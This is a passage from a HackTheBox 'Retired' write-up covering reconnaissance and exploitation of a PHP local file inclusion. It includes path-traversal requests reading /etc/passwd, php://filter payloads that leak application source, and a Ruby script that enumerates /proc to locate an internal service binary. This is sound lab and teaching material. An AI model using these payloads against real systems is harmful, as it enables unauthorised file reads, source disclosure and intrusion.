---
title: HTB/Retired - writeup
date: 2023-03-30 01:33:38 +0100
author: farrimwildaxe
categories: [Writeup,HTB]
tags: [htb,retired,writeup,pwntools,rop,lfi]
img_path: /assets/img/htb/retired
image:
  path: retired.png
  width: 700   # in pixels
  height: 516   # in pixels
  alt: image alternative text
published: true
---

## Introduction

Retired is a HackTheBox machine that chains a few classic tricks: a PHP LFI that leaks source through `php://filter`, a stack buffer overflow in a custom service listening on `127.0.0.1:1337`, a backup script we abuse with a symlink to steal an SSH key, and finally a privileged helper that registers `binfmt_misc` handlers and gives us root.

The path is **www-data → dev → root**.

## Enumeration

We start with an nmap scan to identify open ports and services:

```bash
$ sudo nmap -sSVC -A -O -Pn -T5 -p- 10.129.194.147
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 17:52 EDT
Warning: 10.129.194.147 giving up on port because retransmission cap hit (2). Nmap scan report for 10.129.194.147
Host is up (0.077s latency). Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Aggressive OS guesses: Linux 5.0 (95%), Linux 5.0 - 5.4 (95%), Linux 5.4 (94%), HP P2000 G3 NAS device (93%), Linux 4.15 - 5.6 (93%), Linux 5.3 - 5.4 (93%), Linux 2.6.32 (92%), Infomir MAG-250 set-top box (92%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (92%), Linux 5.0 - 5.3 (92%)
No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   71.53 ms 10.10.16.1
2   35.51 ms 10.129.194.147

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 336.33 seconds
```

Two ports are open: SSH on 22 and HTTP on 80. Opening port 80 in a browser, the URL parameter immediately looks suspicious:

![Webpage with LFI](page.png)

That smells like LFI. We confirm by reading `/etc/passwd`:

```python
$ http -v 'http://retired.htb/index.php?page=../../../../../../../../../../etc/passwd'
GET /index.php?page=../../../../../../../../../../etc/passwd HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: retired.htb
User-Agent: HTTPie/2.6.0

HTTP/1.1 302 Found
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
Date: Sat, 02 Apr 2022 21:56:27 GMT
Location: /index.php?page=default.html
Server: nginx
Transfer-Encoding: chunked

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000::/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dev:x:1001:1001::/home/dev:/bin/bash
```

There is a `dev` user worth remembering. With the LFI confirmed, we can pull PHP source through `php://filter` so the code is not executed on the way out:

```python
$ http -v 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php'
GET /index.php?page=php://filter/convert.base64-encode/resource=index.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: retired.htb
User-Agent: HTTPie/2.6.0

HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Sat, 02 Apr 2022 22:05:07 GMT
Server: nginx
Transfer-Encoding: chunked

PD9waHAKZnVuY3Rpb24gc2FuaXRpemVfaW5wdXQoJHBhcmFtKSB7CiAgICAkcGFyYW0xID0gc3RyX3JlcGxhY2UoIi4uLyIsIiIsJHBhcmFtKTsKICAgICRwYXJhbTIgPSBzdHJfcmVwbGFjZSgiLi8iLCIiLCRwYXJhbTEpOwogICAgcmV0dXJuICRwYXJhbTI7Cn0KCiRwYWdlID0gJF9HRVRbJ3BhZ2UnXTsKaWYgKGlzc2V0KCRwYWdlKSAmJiBwcmVnX21hdGNoKCIvXlthLXpdLyIsICRwYWdlKSkgewogICAgJHBhZ2UgPSBzYW5pdGl6ZV9pbnB1dCgkcGFnZSk7Cn0gZWxzZSB7CiAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaW5kZXgucGhwP3BhZ2U9ZGVmYXVsdC5odG1sJyk7Cn0KCnJlYWRmaWxlKCRwYWdlKTsKPz4K
```

Decoded, `index.php` looks like this:

```python
<?php
function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
} else {
    header('Location: /index.php?page=default.html');
}

readfile($page);
?>
```

The `sanitize_input()` function only strips literal `../` and `./` sequences, and the regex check `^[a-z]` does not block `php://` since stream wrappers start with a letter. Effectively, anything that starts with a lowercase letter is fair game.

Next, a directory bruteforce with gobuster turns up a `beta.html` page:

```python
$ gobuster dir -x txt,sql,bak,zip,bz2,7z,htm,html,js,php -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://retired.htb 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://retired.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              sql,bak,7z,php,txt,zip,bz2,htm,html,js
[+] Timeout:                 10s
===============================================================
2022/04/02 18:27:31 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 302) [Size: 0] [--> /index.php?page=default.html]
/default.html         (Status: 200) [Size: 11414]                               
/assets               (Status: 301) [Size: 162] [--> http://retired.htb/assets/]
/css                  (Status: 301) [Size: 162] [--> http://retired.htb/css/]   
/beta.html            (Status: 200) [Size: 4144]                                   
/js                   (Status: 301) [Size: 162] [--> http://retired.htb/js/]    
Progress: 503294 / 2426171 (20.74%)                                               ^C
[!] Keyboard interrupt detected, terminating.
                                                                                   
===============================================================
2022/04/02 19:35:43 Finished
===============================================================
```

We grab it the same way:

```python
$ http -v 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=beta.html'                                                                                                                
GET /index.php?page=php://filter/convert.base64-encode/resource=beta.html HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Host: retired.htb
User-Agent: HTTPie/2.6.0

HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Sat, 02 Apr 2022 19:41:07 GMT
Server: nginx
Transfer-Encoding: chunked

PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KICAgIDxoZWFkPgogICAgICAgIDxtZXRhIGNoYXJzZXQ9InV0Zi04IiAvPgogICAgICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MSwgc2hyaW5rLXRvLWZpdD1ubyIgLz4KICAgICAgICA8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iIiAvPgogICAgICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iIiAvPgogICAgICAgIDx0aXRsZT5BZ2VuY3kgLSBTdGFydCBCb290c3RyYXAgVGhlbWU8L3RpdGxlPgogICAgICAgIDwhLS0gRmF2aWNvbi0tPgogICAgICAgIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJhc3NldHMvZmF2aWNvbi5pY28iIC8+CiAgICAgICAgPCEtLSBGb250IEF3ZXNvbWUgaWNvbnMgKGZyZWUgdmVyc2lvbiktLT4KICAgICAgICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly91c2UuZm9udGF3ZXNvbWUuY29tL3JlbGVhc2VzL3Y1LjE1LjMvanMvYWxsLmpzIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4KICAgICAgICA8IS0tIEdvb2dsZSBmb250cy0tPgogICAgICAgIDxsaW5rIGhyZWY9Imh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Nb250c2VycmF0OjQwMCw3MDAiIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIC8+CiAgICAgICAgPGxpbmsgaHJlZj0iaHR0cHM6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PVJvYm90bytTbGFiOjQwMCwxMDAsMzAwLDcwMCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyIgLz4KICAgICAgICA8IS0tIENvcmUgdGhlbWUgQ1NTIChpbmNsdWRlcyBCb290c3RyYXApLS0+CiAgICAgICAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KICAgIDwvaGVhZD4KICAgIDxib2R5IGlkPSJwYWdlLXRvcCI+CiAgICAgICAgPCEtLSBNYXN0aGVhZC0tPgogICAgICAgIDxoZWFkZXIgY2xhc3M9Im1hc3RoZWFkIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLXN1YmhlYWRpbmciPldlbGNvbWUgVG8gT3VyIFN0dWRpbyE8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1hc3RoZWFkLWhlYWRpbmcgdGV4dC11cHBlcmNhc2UiPkl0J3MgTmljZSBUbyBNZWV0IFlvdTwvZGl2PgogICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSBidG4teGwgdGV4dC11cHBlcmNhc2UiIGhyZWY9IiNzZXJ2aWNlcyI+VGVsbCBNZSBNb3JlPC9hPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2hlYWRlcj4KICAgICAgICA8IS0tIFNlcnZpY2VzLS0+CiAgICAgICAgPHNlY3Rpb24gY2xhc3M9InBhZ2Utc2VjdGlvbiIgaWQ9ImJldGEiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGV4dC1jZW50ZXIiPgogICAgICAgICAgICAgICAgICAgIDxoMiBjbGFzcz0ic2VjdGlvbi1oZWFkaW5nIHRleHQtdXBwZXJjYXNlIj5CZXRhIFRlc3RpbmcgUHJvZ3JhbSBmb3IgRU1VRU1VPC9oMj4KICAgICAgICAgICAgICAgICAgICBDdXJyZW50bHkgZGV2ZWxvcG1lbnQgZm9yIEVNVUVNVSBqdXN0IHN0YXJ0ZWQsIGJ1dCB3ZSBoYXZlIGJpZyBwbGFucy4KICAgICAgICAgICAgICAgICAgICBJZiB5b3UgYm91Z2h0IGFuIE9TVFJJQ0ggY29uc29sZSBmcm9tIHVzIGFuZCB3YW50IHdhbnQgdG8gYmUgcGFydCBvZiB0aGUgbmV4dCBzdGVwLAogICAgICAgICAgICAgICAgICAgIHlvdSBjYW4gZW5hYmxlIHlvdXIgT1NUUklDSCBsaWNlbnNlIGZvciB1c2FnZSB6IEVNVUVNVSB2aWEgdGhlIGFjdGl2YXRlX2xpY2Vuc2UgYXBwbGljYXRpb24gdG9kYXkKCQkgICAgZm9yIG91ciB1cGNvbWluZyBiZXRhIHRlc3RpbmcgcHJvZ3JhbSBmb3IgRU1VRU1VLjxici8+CiAgICAgICAgICAgICAgICAgICAgQSBsaWNlbnNlIGZpbGVzIGNvbnRhaW5zIGEgNTEyIGJpdCBrZXkuIFRoYXQga2V5IGlzIGFsc28gaW4gdGhlIFFSIGNvZGUgY29udGFpbmVkIHdpdGhpbiB0aGUgT1NUUklDSCBwYWNrYWdlLgoJCSAgICBUaGFuayB5b3UgZm9yIHBhcnRpY2lwYXRpbmcgdyBvdXIgYmV0YSB0ZXN0aW5nIHByb2dyYW0uCiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iYWN0aXZhdGVfbGljZW5zZS5waHAiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CiAgICAgICAgICAgICAgICAgICAgPGxhYmVsIGZvcj0iZm9ybUZpbGUiIGNsYXNzPSJmb3JtLWxhYmVsIj5VcGxvYWQgTGljZW5zZSBLZXkgRmlsZTwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgPGlucHV0IGNsYXNzPSJmb3JtLWNvbnRyb2wgZm9ybS1jb250cm9sLWxnIiBpZD0iZm9ybUZpbGUiIHR5cGU9ImZpbGUiIG5hbWU9ImxpY2Vuc2VmaWxlIi8+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiPlN1Ym1pdDwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9mb3JtPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L3NlY3Rpb24+CiAgICAgICAgPCEtLSBGb290ZXItLT4KICAgICAgICA8Zm9vdGVyIGNsYXNzPSJmb290ZXIgcHktNCI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJyb3cgYWxpZ24taXRlbXMtY2VudGVyIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb2wtbGctNCB0ZXh0LWxnLXN0YXJ0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgaHJlZj0iaHR0cHM6Ly9zdGFydGJvb3RzdHJhcC5jb20vdGhlbWUvYWdlbmN5Ij5BZ2VuY3kgQm9vdHN0cmFwIFRoZW1lPC9hPgogICAgICAgICAgICAgICAgICAgICAgICByZWxlYXNlZCB1bmRlciA8YSBocmVmPSJodHRwczovL2dpdGh1Yi5jb20vc3RhcnRib290c3RyYXAvc3RhcnRib290c3RyYXAtYWdlbmN5L2Jsb2IvbWFzdGVyL0xJQ0VOU0UiPk1JVCBMaWNlbnNlPC9hPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy00IG15LTMgbXktbGctMCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidG4gYnRuLWRhcmsgYnRuLXNvY2lhbCBteC0yIiBocmVmPSIjISI+PGkgY2xhc3M9ImZhYiBmYS10d2l0dGVyIj48L2k+PC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnRuIGJ0bi1kYXJrIGJ0bi1zb2NpYWwgbXgtMiIgaHJlZj0iIyEiPjxpIGNsYXNzPSJmYWIgZmEtZmFjZWJvb2stZiI+PC9pPjwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImJ0biBidG4tZGFyayBidG4tc29jaWFsIG14LTIiIGhyZWY9IiMhIj48aSBjbGFzcz0iZmFiIGZhLWxpbmtlZGluLWluIj48L2k+PC9hPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNvbC1sZy00IHRleHQtbGctZW5kIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGEgY2xhc3M9ImxpbmstZGFyayB0ZXh0LWRlY29yYXRpb24tbm9uZSBtZS0zIiBocmVmPSIjISI+UHJpdmFjeSBQb2xpY3k8L2E+CiAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJsaW5rLWRhcmsgdGV4dC1kZWNvcmF0aW9uLW5vbmUiIGhyZWY9IiMhIj5UZXJtcyBvZiBVc2U8L2E+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9mb290ZXI+CiAgICAgICAgPCEtLSBCb290c3RyYXAgY29yZSBKUy0tPgogICAgICAgIDxzY3JpcHQgc3JjPSJodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvbnBtL2Jvb3RzdHJhcEA1LjEuMC9kaXN0L2pzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KICAgICAgICA8IS0tIENvcmUgdGhlbWUgSlMtLT4KICAgICAgICA8c2NyaXB0IHNyYz0ianMvc2NyaXB0cy5qcyI+PC9zY3JpcHQ+CiAgICA8L2JvZHk+CjwvaHRtbD4K
```

The page contains an upload form that posts to `activate_license.php`:

![Form on a beta page](form.png)

We pull that file too:

```python
$ http -v 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=activate_license.php' 
GET /index.php?page=php://filter/convert.base64-encode/resource=activate_license.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive
Host: retired.htb
User-Agent: HTTPie/2.6.0

HTTP/1.1 200 OK
Connection: keep-alive
Content-Encoding: gzip
Content-Type: text/html; charset=UTF-8
Date: Sat, 02 Apr 2022 19:50:05 GMT
Server: nginx
Transfer-Encoding: chunked

PD9waHAKaWYoaXNzZXQoJF9GSUxFU1snbGljZW5zZWZpbGUnXSkpIHsKICAgICRsaWNlbnNlICAgICAgPSBmaWxlX2dldF9jb250ZW50cygkX0ZJTEVTWydsaWNlbnNlZmlsZSddWyd0bXBfbmFtZSddKTsKICAgICRsaWNlbnNlX3NpemUgPSAkX0ZJTEVTWydsaWNlbnNlZmlsZSddWydzaXplJ107CgogICAgJHNvY2tldCA9IHNvY2tldF9jcmVhdGUoQUZfSU5FVCwgU09DS19TVFJFQU0sIFNPTF9UQ1ApOwogICAgaWYgKCEkc29ja2V0KSB7IGVjaG8gImVycm9yIHNvY2tldF9jcmVhdGUoKVxuIjsgfQoKICAgIGlmICghc29ja2V0X2Nvbm5lY3QoJHNvY2tldCwgJzEyNy4wLjAuMScsIDEzMzcpKSB7CiAgICAgICAgZWNobyAiZXJyb3Igc29ja2V0X2Nvbm5lY3QoKSIgLiBzb2NrZXRfc3RyZXJyb3Ioc29ja2V0X2xhc3RfZXJyb3IoKSkgLiAiXG4iOwogICAgfQoKICAgIHNvY2tldF93cml0ZSgkc29ja2V0LCBwYWNrKCJOIiwgJGxpY2Vuc2Vfc2l6ZSkpOwogICAgc29ja2V0X3dyaXRlKCRzb2NrZXQsICRsaWNlbnNlKTsKCiAgICBzb2NrZXRfc2h1dGRvd24oJHNvY2tldCk7CiAgICBzb2NrZXRfY2xvc2UoJHNvY2tldCk7Cn0KPz4K
```

Decoded:

```python
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

So there is an internal service on port `1337` that the upload handler forwards data to. Since the LFI also reads from `/proc`, we can enumerate processes and find out what it is. The useful files are:

- `/proc/sys/kernel/version`
- `/proc/sys/kernel/pid_max`
- `/proc/sys/kernel/randomize_va_space`
- `/proc/sys/kernel/hostname`
- `/proc/sys/kernel/domainname`
- `/proc/<pid>/cmdline`
- `/proc/<pid>/maps`

A small ruby script walks them for us:

```ruby
require 'net/http'
require 'base64'

max_pid = '10000'

host = 'retired.htb'
url = "http://#{host}/index.php?page="

puts "=============================[ Kernel ]==================================="
s = "#{url}/proc/sys/kernel/version"
k = URI("#{s}")
res = Net::HTTP.get_response(k) # => String
puts "version: #{res.body}"

s = "#{url}/proc/sys/kernel/pid_max"
k = URI("#{s}")
res = Net::HTTP.get_response(k) # => String
max_pid = res.body if res.code == "302"
puts "max PID: #{max_pid}" if res.code == "302"

s = "#{url}/proc/sys/kernel/randomize_va_space"
k = URI("#{s}")
res = Net::HTTP.get_response(k) # => String
puts "randomize_va_space: #{res.body}" if res.code == "302"

s = "#{url}/proc/sys/kernel/hostname"
k = URI("#{s}")
res = Net::HTTP.get_response(k) # => String
puts "host name: #{res.body}" if res.code == "302"

s = "#{url}/proc/sys/kernel/domainname"
k = URI("#{s}")
res = Net::HTTP.get_response(k) # => String
puts "domain name: #{res.body}" if res.code == "302"

s = "#{url}php://filter/convert.base64-encode/resource=/proc/self"
e = URI("#{s}/cmdline")
res = Net::HTTP.get_response(e) # => String
puts "=============================[ PID: self ]================================"
puts "[cmdline] #{Base64.decode64(res.body)}\n"

e = URI("#{s}/maps")
res = Net::HTTP.get_response(e) # => String
puts "[maps]\n#{Base64.decode64(res.body)}\n"

(200..max_pid.to_i).each do |n|
  s = "#{url}php://filter/convert.base64-encode/resource=/proc/#{n}/"
  e = URI("#{s}/cmdline")
  res = Net::HTTP.get_response(e) # => String
  if res.code == "200" && res.body && res.body.chomp.size > 0
    puts "=============================[ PID: #{n} ]================================"
    puts "[cmdline] #{Base64.decode64(res.body)}\n"

    e = URI("#{s}/maps")
    res = Net::HTTP.get_response(e) # => String
    puts "[maps]\n#{Base64.decode64(res.body)}\n"
  end
end
```

Output (memory maps for unrelated processes trimmed):

```bash
$ ruby lfi-proc.rb
=============================[ Kernel ]===================================
version: #1 SMP Debian 5.10.92-2 (2022-02-28)
max PID: 4194304
randomize_va_space: 2
host name: retired
domain name: (none)
=============================[ PID: self ]================================
[cmdline] php-fpm: pool www
[maps]
( ... )

=============================[ PID: 417 ]================================
[cmdline] /usr/bin/activate_license1337
[maps]
56194c7c8000-56194c7c9000 r--p 00000000 08:01 2408                       /usr/bin/activate_license
56194c7c9000-56194c7ca000 r-xp 00001000 08:01 2408                       /usr/bin/activate_license
56194c7ca000-56194c7cb000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
56194c7cb000-56194c7cc000 r--p 00002000 08:01 2408                       /usr/bin/activate_license
56194c7cc000-56194c7cd000 rw-p 00003000 08:01 2408                       /usr/bin/activate_license
56194e392000-56194e3b3000 rw-p 00000000 00:00 0                          [heap]
7f041bfab000-7f041bfad000 rw-p 00000000 00:00 0 
7f041bfad000-7f041bfae000 r--p 00000000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfae000-7f041bfb0000 r-xp 00001000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfb0000-7f041bfb1000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfb1000-7f041bfb2000 r--p 00003000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfb2000-7f041bfb3000 rw-p 00004000 08:01 3635                       /usr/lib/x86_64-linux-gnu/libdl-2.31.so
7f041bfb3000-7f041bfba000 r--p 00000000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfba000-7f041bfca000 r-xp 00007000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfca000-7f041bfcf000 r--p 00017000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfcf000-7f041bfd0000 r--p 0001b000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfd0000-7f041bfd1000 rw-p 0001c000 08:01 3645                       /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
7f041bfd1000-7f041bfd5000 rw-p 00000000 00:00 0 
7f041bfd5000-7f041bfe4000 r--p 00000000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041bfe4000-7f041c07e000 r-xp 0000f000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041c07e000-7f041c117000 r--p 000a9000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041c117000-7f041c118000 r--p 00141000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041c118000-7f041c119000 rw-p 00142000 08:01 3636                       /usr/lib/x86_64-linux-gnu/libm-2.31.so
7f041c119000-7f041c13e000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c13e000-7f041c289000 r-xp 00025000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c289000-7f041c2d3000 r--p 00170000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c2d3000-7f041c2d4000 ---p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c2d4000-7f041c2d7000 r--p 001ba000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c2d7000-7f041c2da000 rw-p 001bd000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f041c2da000-7f041c2de000 rw-p 00000000 00:00 0 
7f041c2de000-7f041c2ee000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c2ee000-7f041c3e6000 r-xp 00010000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c3e6000-7f041c41a000 r--p 00108000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c41a000-7f041c41e000 r--p 0013b000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c41e000-7f041c421000 rw-p 0013f000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
7f041c421000-7f041c423000 rw-p 00000000 00:00 0 
7f041c428000-7f041c429000 r--p 00000000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c429000-7f041c449000 r-xp 00001000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c449000-7f041c451000 r--p 00021000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c452000-7f041c453000 r--p 00029000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c453000-7f041c454000 rw-p 0002a000 08:01 3630                       /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f041c454000-7f041c455000 rw-p 00000000 00:00 0 
7ffd7e9ce000-7ffd7e9ef000 rw-p 00000000 00:00 0                          [stack]
7ffd7e9f5000-7ffd7e9f9000 r--p 00000000 00:00 0                          [vvar]
7ffd7e9f9000-7ffd7e9fb000 r-xp 00000000 00:00 0                          [vdso]

=============================[ PID: 599 ]================================
[cmdline] nginx: worker process
[maps]
( ... )

=============================[ PID: 600 ]================================
[cmdline] nginx: worker process
[maps]
(...)

=============================[ PID: 615 ]================================
[cmdline] php-fpm: pool www
[maps]

^C
```

PID 417 is our target: `/usr/bin/activate_license`. We pull the binary the same way as the PHP files:

```bash
$ wget 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_license' -O activate_license.b64
--2022-04-03 09:11:42--  http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_license
Connecting to retired.htb:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/html]
Saving to: 'activate_license. b64'

activate_license.b64                                                    [  <=>                                                                                                                                                             ]  29.34K   142KB/s    in 0.2s    

2022-04-03 09:11:43 (142 KB/s) - 'activate_license.b64' saved [30048]

